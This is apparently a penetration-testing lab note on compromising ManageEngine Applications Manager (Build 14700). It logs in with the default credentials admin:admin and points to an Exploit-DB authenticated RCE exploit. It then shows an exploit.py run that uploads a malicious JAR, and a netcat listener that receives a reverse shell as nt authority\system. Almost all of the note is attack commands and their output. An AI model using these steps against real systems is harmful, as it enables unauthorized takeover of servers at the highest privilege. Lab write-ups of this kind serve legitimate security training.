# 2 :40443 Application Manager

```
ManageEngine Applications Manager (Build No:14700)   

http://192.168.71.96:40443
Login Page

# trying default creds
admin:admin
# worked
> http://192.168.71.96:40443/index.do

Authenticated RCE https://www.exploit-db.com/exploits/48793
# manual
Login > Admin > Upload Files / Binaries 
jar based reverse shell / jsp
Select Upload Script to <Product_Home>/working/
Use Execute Program to run it.
# execute program can be used to 

$ python3 exploit.py http://192.168.197.96:40443 admin admin 192.168.49.197 443
[*] Visiting page to retrieve initial cookies...
[*] Retrieving admin cookie...
[*] Getting base directory of ManageEngine...
[*] Found base directory: C:\Program Files\ManageEngine\AppManager14
[*] Creating JAR file...
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
added manifest
adding: weblogic/jndi/Environment.class(in = 1844) (out= 1080)(deflated 41%)
[*] Uploading JAR file...
[*] Attempting to upload JAR directly to targeted Weblogic folder...
[!] Failed to upload JAR directly, continue to add and execute job to move JAR...
[*] Creating a task to move the JAR file to relative path: classes/weblogic/version8/...
[*] Found actionname: move_weblogic_jar2902 with found actionid 10000003
[*] Executing created task with id: 10000003 to copy JAR...
[*] Task 10000003 has been executed successfully
[*] Deleting created task as JAR has been copied...
[*] Running the Weblogic credentialtest which triggers the code in the JAR...
[*] Check your shell...


$ nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.49.197] from (UNKNOWN) [192.168.197.96] 49821
Microsoft Windows [Version 10.0.18362.1082]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\ManageEngine\AppManager14\working>whoami
whoami
nt authority\system
```
